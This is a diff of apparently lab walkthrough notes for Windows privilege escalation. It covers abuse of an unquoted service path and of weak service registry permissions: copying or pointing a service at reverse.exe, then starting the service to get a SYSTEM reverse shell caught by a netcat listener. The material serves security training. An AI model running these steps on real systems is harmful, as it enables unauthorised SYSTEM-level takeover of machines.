@@ -112,22 +112,27 @@ net start daclsvc
 
 Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.
 
+**VICTIM**
+
 ```
 sc qc unquotedsvc
 ```
 
-Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:\
+<figure><img src="../../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>
 
+Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
 
-
+**Victim**
 
 ```
 C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
 ```
 
+<figure><img src="../../.gitbook/assets/image (1211).png" alt=""><figcaption></figcaption></figure>
+
 Copy the reverse.exe executable you created to this directory and rename it Common.exe:
 
-
+**Victim**
 
 ```
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
@@ -135,45 +140,67 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 
 Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
 
+**Kali**
 
+```
+rlwrap nc -nvlp 54 
+```
+
+**Victim**
 
 ```
 net start unquotedsvc
 ```
 
+<figure><img src="../../.gitbook/assets/image (1212).png" alt=""><figcaption></figcaption></figure>
+
 ## Service Exploits - Weak Registry Permissions
 
 Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).
 
-
+**Victim**
 
 ```
 sc qc regsvc
 ```
 
+<figure><img src="../../.gitbook/assets/image (1213).png" alt=""><figcaption></figcaption></figure>
+
 Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
 
-
+**Victim**
 
 ```
 C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
 ```
 
+<figure><img src="../../.gitbook/assets/image (1214).png" alt=""><figcaption></figcaption></figure>
+
 Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
 
-
+**Victim**
 
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
 ```
 
+<figure><img src="../../.gitbook/assets/image (1215).png" alt=""><figcaption></figcaption></figure>
+
 Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+
+**Kali**
+
+```
+rlwrap nc -nvlp 54 
+```
+
+**Victim**
 
 ```
 net start regsvc
 ```
 
-
+<figure><img src="../../.gitbook/assets/image (1216).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Exploits - Insecure Service Executables
 
